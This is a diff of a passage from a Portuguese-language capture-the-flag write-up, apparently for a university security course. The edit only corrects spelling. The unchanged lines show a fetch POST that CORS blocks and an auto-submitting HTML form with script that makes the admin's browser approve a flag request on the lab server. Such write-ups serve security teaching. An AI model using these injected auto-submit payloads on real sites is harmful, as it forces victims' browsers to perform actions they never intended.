@@ -85,14 +85,14 @@ Depois encontramos o botão que servia para o admin nos enviar a flag.
 
 ![](https://i.imgur.com/2qsy1WJ.png)
 
-Uma vez que a porta do site de origem é diferente da do site onde se envia o post, se fizermos apenas um script que envia o pedido (usando fetch) o coors bloqueia como se pode ver a seguir.
+Uma vez que a porta do site de origem é diferente da do site onde se envia o post, se fizermos apenas um script que envia o pedido (usando fetch) o CORS bloqueia como se pode ver a seguir.
 
 ```htmlembedded=
 <script> fetch("http://ctf-fsi.fe.up.pt:5005//request/4e860dc39ba2a2b06f97508f88194861dad75ebc/approve) ", {method: "POST"})</script>
 ```
 ![](https://i.imgur.com/bf3xyOm.png)
 
-Uma forma de contornar isso é criar um form, e submete-lo.
+Uma forma de contornar isso é criar um form, e submetê-lo.
 
 ```htmlembedded=
 <form id="flag_form" method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/28682e517d19ba1c197a730cebbb738e484b1fdc/approve" role="form"> <div class="submit"> <input type="submit" id="giveflag" value="Give the flag" > </div> </form> <script> console.log(document.getElementById('flag')); document.getElementById('giveflag').click() </script>
